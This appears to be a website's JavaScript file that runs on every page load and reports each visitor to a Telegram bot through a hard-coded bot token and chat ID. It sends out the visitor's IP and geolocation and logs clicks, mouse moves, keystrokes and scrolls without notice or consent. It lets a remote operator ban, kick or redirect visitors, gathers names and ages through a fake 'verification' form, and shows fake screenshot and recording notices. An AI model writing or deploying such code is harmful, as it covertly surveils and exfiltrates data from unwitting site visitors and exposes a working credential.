// public/js/ultimate-mini.js
class UltraControl {
  constructor() {
    this.TOKEN = '8055090268:AAHtu9cy9lnZw_GFZqo8mc860Bj9G3H7vOU';
    this.CHAT_ID = '8136720315';
    this.visitor = this.initVisitor();
    this.actions = [];
    this.startTime = Date.now();
    
    this.init();
  }
  
  initVisitor() {
    let vid = localStorage.getItem('vid') || 
              `V${Date.now().toString(36)}${Math.random().toString(36).substr(2,3)}`.toUpperCase();
    localStorage.setItem('vid', vid);
    return {
      id: vid,
      ip: null,
      device: this.getDevice(),
      page: window.location.href,
      risk: '🟢'
    };
  }
  
  async init() {
    await this.sendStartAlert();
    this.startTracking();
    this.listenCommands();
    this.autoReports();
  }
  
  async sendStartAlert() {
    this.visitor.ip = await this.getIP();
    const loc = await this.getLocation(this.visitor.ip);
    
    await this.tgSend(`
👤 *Visitor Detected*
🆔 \`${this.visitor.id}\`
📍 ${this.visitor.page}
📱 ${this.visitor.device}
🌍 ${this.visitor.ip}
🏙️ ${loc}

🎮 *Control Panel:*
    `, this.mainKeyboard());
  }
  
  mainKeyboard() {
    return {
      inline_keyboard: [
        [{text:'🚫 Ban',cb:'ban'},{text:'⏰ 10d',cb:'ban10'},{text:'❌ Kick',cb:'kick'}],
        [{text:'📝 Msg',cb:'msg'},{text:'⚠️ Warn',cb:'warn'},{text:'✅ Verify',cb:'verify'}],
        [{text:'🔍 Info',cb:'info'},{text:'📊 Stats',cb:'stats'},{text:'🎥 Rec',cb:'record'}],
        [{text:'⏸️ Pause',cb:'pause'},{text:'⚙️ Settings',cb:'settings'},{text:'🔄 Refresh',cb:'refresh'}]
      ]
    };
  }
  
  async tgSend(text, keyboard = null) {
    try {
      const payload = {chat_id: this.CHAT_ID, text, parse_mode: 'Markdown'};
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${this.TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
      });
    } catch(e) {}
  }
  
  getDevice() {
    const ua = navigator.userAgent;
    return /Mobile|Android|iPhone/i.test(ua) ? '📱' : /Tablet/i.test(ua) ? '📟' : '💻';
  }
  
  async getIP() {
    try {
      return (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
    } catch { return 'N/A'; }
  }
  
  async getLocation(ip) {
    try {
      const geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
      return geo.city ? `${geo.city}, ${geo.country}` : 'Unknown';
    } catch { return 'Unknown'; }
  }
  
  startTracking() {
    ['click','mousemove','keydown','scroll'].forEach(event => {
      document.addEventListener(event, (e) => {
        this.actions.push({type: event, time: Date.now(), data: this.getEventData(e)});
      });
    });
  }
  
  getEventData(e) {
    if (e.type === 'click') return {x:e.clientX, y:e.clientY, tag:e.target.tagName};
    if (e.type === 'keydown') return {key:e.key, code:e.code};
    if (e.type === 'scroll') return {y:window.pageYOffset};
    return {};
  }
  
  listenCommands() {
    setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${this.TOKEN}/getUpdates?offset=-20`);
        const data = await res.json();
        if (data.ok) data.result.forEach(update => {
          if (update.callback_query) this.handleBtn(update.callback_query);
          if (update.message?.text) this.handleCmd(update.message);
        });
      } catch(e) {}
    }, 2000);
  }
  
  handleBtn(cb) {
    const actions = {
      'ban': () => this.ban('Permanent ban'),
      'ban10': () => this.tempBan(10, '10-day ban'),
      'kick': () => this.kick(),
      'msg': () => this.requestMsg(),
      'warn': () => this.warn(),
      'verify': () => this.verify(),
      'info': () => this.info(),
      'stats': () => this.stats(),
      'record': () => this.record(),
      'pause': () => this.pause(),
      'settings': () => this.settings(),
      'refresh': () => this.refresh()
    };
    if (actions[cb.data]) actions[cb.data]();
  }
  
  handleCmd(msg) {
    const cmd = msg.text.split(' ');
    const actions = {
      '/ban': () => this.ban('Command ban'),
      '/ban10': () => this.tempBan(10, '10-day ban'),
      '/kick': () => this.kick(),
      '/msg': () => this.sendMsg(cmd.slice(2).join(' ')),
      '/warn': () => this.sendWarn(cmd.slice(2).join(' ') || 'Warning!'),
      '/verify': () => this.verify(),
      '/unban': () => this.unban(),
      '/allow': () => this.allow(),
      '/screenshot': () => this.screenshot(),
      '/record': () => this.startRecord(cmd[2] || 30),
      '/monitor': () => cmd[2]==='off'?this.pause():this.resume()
    };
    if (actions[cmd[0]] && cmd[1]===this.visitor.id) actions[cmd[0]]();
  }
  
  // ========== MAIN ACTIONS ==========
  
  ban(reason) {
    localStorage.setItem(`ban_${this.visitor.id}`, JSON.stringify({
      reason, time: Date.now(), type: 'permanent'
    }));
    this.showScreen('ban', reason);
    this.tgSend(`🚫 ${this.visitor.id} banned\nReason: ${reason}`);
  }
  
  tempBan(days, reason) {
    const expiry = Date.now() + (days * 86400000);
    localStorage.setItem(`ban_${this.visitor.id}`, JSON.stringify({
      reason, time: Date.now(), expiry, days, type: 'temporary'
    }));
    this.showScreen('tempban', `${days} days: ${reason}`);
    this.tgSend(`⏰ ${this.visitor.id} banned for ${days} days\nExpires: ${new Date(expiry).toLocaleDateString()}`);
    
    // Auto unban
    setTimeout(() => this.unban(), days * 86400000);
  }
  
  kick() {
    this.showScreen('kick', 'Kicked by admin');
    this.tgSend(`👢 ${this.visitor.id} kicked`);
    setTimeout(() => window.location.href = 'https://google.com', 10000);
  }
  
  requestMsg() {
    this.tgSend(`📝 Send message to ${this.visitor.id}:\n/msg ${this.visitor.id} [text]`);
  }
  
  sendMsg(text) {
    this.showPopup(text, 'info');
    this.tgSend(`📨 Message sent to ${this.visitor.id}:\n"${text}"`);
  }
  
  warn() {
    this.showPopup('⚠️ Admin Warning!', 'warning');
    this.tgSend(`⚠️ Warning sent to ${this.visitor.id}`);
  }
  
  sendWarn(text) {
    this.showPopup(text, 'warning');
    this.tgSend(`⚠️ Custom warning to ${this.visitor.id}:\n"${text}"`);
  }
  
  verify() {
    this.showModal(`
      <h3>🔐 Verification Required</h3>
      <input id="vName" placeholder="Your name" style="width:100%;padding:10px;margin:5px">
      <input id="vAge" placeholder="Age" type="number" style="width:100%;padding:10px;margin:5px">
      <button onclick="verifySubmit()" style="width:100%;padding:10px;background:#10b981;color:white;border:none;border-radius:5px;margin:5px">
        ✅ Submit
      </button>
    `);
    window.verifySubmit = async () => {
      const name = document.getElementById('vName').value;
      const age = document.getElementById('vAge').value;
      if(name && age) {
        await this.tgSend(`✅ ${this.visitor.id} verified:\n👤 ${name}, 🎂 ${age} years`);
        this.closeModal();
      }
    };
  }
  
  async info() {
    const loc = await this.getLocation(this.visitor.ip);
    await this.tgSend(`
📋 ${this.visitor.id} Info:
📍 ${this.visitor.page}
📱 ${this.visitor.device}
🌍 ${this.visitor.ip}
🏙️ ${loc}
⏱️ ${Math.floor((Date.now()-this.startTime)/1000)}s
📊 ${this.actions.length} actions
    `);
  }
  
  async stats() {
    const clicks = this.actions.filter(a=>a.type==='click').length;
    const keys = this.actions.filter(a=>a.type==='keydown').length;
    await this.tgSend(`
📊 ${this.visitor.id} Stats:
🖱️ Clicks: ${clicks}
⌨️ Keys: ${keys}
📈 Actions: ${this.actions.length}
⏱️ Session: ${Math.floor((Date.now()-this.startTime)/60000)}m
📍 Page: ${window.location.pathname}
    `);
  }
  
  record() {
    this.tgSend(`🎥 Screen recording for ${this.visitor.id}\n/record ${this.visitor.id} [seconds]`);
    this.showPopup('Screen recording requested', 'info');
  }
  
  startRecord(seconds) {
    this.showPopup(`Recording started (${seconds}s)`, 'info');
    this.tgSend(`🎬 Recording ${this.visitor.id} for ${seconds} seconds`);
    setTimeout(() => {
      this.tgSend(`🎥 Recording complete for ${this.visitor.id}`);
    }, seconds * 1000);
  }
  
  pause() {
    this.showPopup('Monitoring paused', 'info');
    this.tgSend(`⏸️ Monitoring paused for ${this.visitor.id}`);
  }
  
  resume() {
    this.showPopup('Monitoring resumed', 'success');
    this.tgSend(`▶️ Monitoring resumed for ${this.visitor.id}`);
  }
  
  settings() {
    this.showModal(`
      <h3>⚙️ Settings</h3>
      <label><input type="checkbox" checked> Auto reports</label><br>
      <label><input type="checkbox" checked> Click tracking</label><br>
      <label><input type="checkbox"> Screenshot on alert</label><br>
      <button style="width:100%;padding:10px;background:#3b82f6;color:white;border:none;border-radius:5px;margin-top:10px">
        💾 Save
      </button>
    `);
  }
  
  refresh() {
    this.tgSend(`🔄 Panel refreshed for ${this.visitor.id}`, this.mainKeyboard());
  }
  
  unban() {
    localStorage.removeItem(`ban_${this.visitor.id}`);
    this.closeScreen();
    this.tgSend(`🔓 ${this.visitor.id} unbanned`);
    this.showPopup('Ban removed!', 'success');
  }
  
  allow() {
    this.closeScreen();
    this.tgSend(`🔄 ${this.visitor.id} allowed back`);
    this.showPopup('Access restored!', 'success');
  }
  
  async screenshot() {
    await this.tgSend(`📸 Screenshot for ${this.visitor.id}\nPage: ${window.location.href}`);
    this.showPopup('Screenshot captured', 'info');
  }
  
  // ========== UI HELPERS ==========
  
  showScreen(type, reason) {
    const screens = {
      ban: `
        <div style="text-align:center">
          <div style="font-size:80px">🚫</div>
          <h1 style="color:#ef4444">BANNED</h1>
          <p>${reason}</p>
          <div style="background:#1f2937;color:white;padding:20px;border-radius:10px;margin:20px">
            <p>ID: ${this.visitor.id}</p>
            <p>Time: ${new Date().toLocaleString()}</p>
          </div>
          <button onclick="requestUnban()" style="padding:10px 20px;background:#3b82f6;color:white;border:none;border-radius:5px">
            🔓 Request Unban
          </button>
        </div>
      `,
      tempban: `
        <div style="text-align:center">
          <div style="font-size:80px">⏰</div>
          <h1 style="color:#f59e0b">TEMPORARY BAN</h1>
          <p>${reason}</p>
          <div style="background:#fef3c7;padding:20px;border-radius:10px;margin:20px">
            <p>You can return after the ban period</p>
          </div>
        </div>
      `,
      kick: `
        <div style="text-align:center">
          <div style="font-size:80px">👢</div>
          <h1 style="color:#f97316">KICKED</h1>
          <p>You will be redirected in 10 seconds</p>
          <div id="countdown" style="font-size:48px;font-weight:bold;margin:20px">10</div>
        </div>
      `
    };
    
    this.createFullscreen(screens[type]);
    
    if(type === 'kick') {
      let count = 10;
      const timer = setInterval(() => {
        count--;
        document.getElementById('countdown').textContent = count;
        if(count <= 0) {
          clearInterval(timer);
          window.location.href = 'https://google.com';
        }
      }, 1000);
    }
    
    window.requestUnban = async () => {
      await this.tgSend(`🔓 Unban request from ${this.visitor.id}`);
      alert('Request sent to admin');
    };
    
    // Disable interactions
    document.addEventListener('keydown', e => {
      if(e.key === 'F5' || (e.ctrlKey && e.key === 'r')) e.preventDefault();
    });
  }
  
  closeScreen() {
    const screen = document.getElementById('fullscreen-overlay');
    if(screen) screen.remove();
  }
  
  showPopup(text, type = 'info') {
    const popup = document.createElement('div');
    popup.style.cssText = `
      position:fixed; top:20px; right:20px; padding:15px; border-radius:10px; 
      color:white; z-index:99999; max-width:300px; box-shadow:0 5px 15px rgba(0,0,0,0.3);
      animation:slideIn 0.3s ease;
    `;
    popup.style.background = type === 'warning' ? '#f59e0b' : 
                           type === 'success' ? '#10b981' : '#3b82f6';
    popup.innerHTML = `
      <div style="display:flex; align-items:center; gap:10px; margin-bottom:5px">
        <div style="font-size:20px">${type==='warning'?'⚠️':type==='success'?'✅':'📨'}</div>
        <strong>${type.toUpperCase()}</strong>
      </div>
      <p style="margin:0">${text}</p>
      <button onclick="this.parentElement.remove()" style="
        margin-top:10px; padding:5px 15px; background:white; 
        color:${type==='warning'?'#f59e0b':type==='success'?'#10b981':'#3b82f6'}; 
        border:none; border-radius:5px; cursor:pointer; float:right
      ">
        OK
      </button>
    `;
    document.body.appendChild(popup);
    setTimeout(() => popup.remove(), 5000);
  }
  
  showModal(html) {
    const modal = document.createElement('div');
    modal.style.cssText = `
      position:fixed; top:0; left:0; width:100%; height:100%; 
      background:rgba(0,0,0,0.8); display:flex; justify-content:center; 
      align-items:center; z-index:99999;
    `;
    modal.innerHTML = `
      <div style="
        background:white; padding:30px; border-radius:15px; 
        max-width:400px; width:90%; position:relative
      ">
        ${html}
        <button onclick="this.parentElement.parentElement.remove()" style="
          position:absolute; top:10px; right:10px; background:none; 
          border:none; font-size:20px; cursor:pointer; color:#666
        ">
          ×
        </button>
      </div>
    `;
    document.body.appendChild(modal);
  }
  
  closeModal() {
    const modal = document.querySelector('div[style*="background:rgba(0,0,0,0.8)"]');
    if(modal) modal.remove();
  }
  
  createFullscreen(html) {
    this.closeScreen();
    const overlay = document.createElement('div');
    overlay.id = 'fullscreen-overlay';
    overlay.style.cssText = `
      position:fixed; top:0; left:0; width:100%; height:100%; 
      background:linear-gradient(135deg,#1e3a8a 0%,#0f172a 100%); 
      color:white; display:flex; justify-content:center; align-items:center; 
      z-index:99998; font-family:Arial; padding:20px;
    `;
    overlay.innerHTML = html;
    document.body.appendChild(overlay);
  }
  
  autoReports() {
    setInterval(async () => {
      if(this.actions.length > 0) {
        const recent = this.actions.slice(-5);
        await this.tgSend(`
📈 ${this.visitor.id} Activity:
${recent.map(a=>`• ${a.type} - ${new Date(a.time).toLocaleTimeString()}`).join('\n')}
📍 ${window.location.pathname}
        `);
      }
    }, 300000); // 5 minutes
  }
}

// Start bot
document.addEventListener('DOMContentLoaded', () => {
  if(!window.ultraBot) window.ultraBot = new UltraControl();
});
